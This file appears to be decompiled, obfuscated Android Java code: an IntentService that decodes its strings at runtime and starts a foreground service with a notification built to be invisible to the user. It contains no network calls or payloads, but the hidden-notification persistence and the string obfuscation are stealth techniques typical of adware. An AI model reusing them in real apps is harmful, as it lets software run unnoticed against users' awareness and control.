package com.sonnokta;

import android.app.IntentService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

import com.sonnokta.utils.LogUtil;

import fddo.Cbreak;
import fddo.Cgoto;

public class p041i extends IntentService {
    private static String TAG = "bwolf-p041i";

    /* renamed from: fddo  reason: collision with root package name */
    private static final String f96fddo = Cbreak.fddo("00fcfd4338cc");

    public p041i() {
        super("");
    }

    public static void fddo(Context context, Service service) {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            service.startForeground(2777, (Cgoto.ifdf >= Cgoto.f63case ? new Notification.Builder(context, Cgoto.ifdf >= Cgoto.f63case ? ifdf(context, Cbreak.fddo("4da7c75c35caf7"), Cbreak.fddo("5daad44432ccfe")) : "") : new Notification.Builder(context)).setOngoing(true).setSmallIcon(context.getResources().getIdentifier("icon", "drawable", context.getPackageName())).setPriority(-2).setCategory("service").build());
        }
    }

    /* renamed from: for  reason: not valid java name */
    public static void m24for(Context context) {
        LogUtil.showErrorLog(TAG, "--- m24for ---");
        if (Cgoto.ifdf < Cgoto.f63case) {
            Intent intent = new Intent(context, p041i.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startService(intent);
        }
    }

    public static String ifdf(Context context, String str, String str2) {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        NotificationChannel notificationChannel = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            notificationChannel = new NotificationChannel(str, str2, NotificationManager.IMPORTANCE_NONE);
            notificationChannel.setLightColor(-16776961);
            notificationChannel.setLockscreenVisibility(0);
            ((NotificationManager) context.getSystemService(Cbreak.fddo("50adc1433ac0f1ff7b3ab033"))).createNotificationChannel(notificationChannel);
        }
        return str;
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onHandleIntent ---");
        try {
            if (!Cgoto.dfhaefdhadfhdfherh(getApplicationContext())) {
                fddo(getApplicationContext(), this);
                stopForeground(true);
            }
        } catch (Exception e) {
            Cgoto.m110class(getApplicationContext(), "EXC_HIDE_INT", e);
        }
    }
}
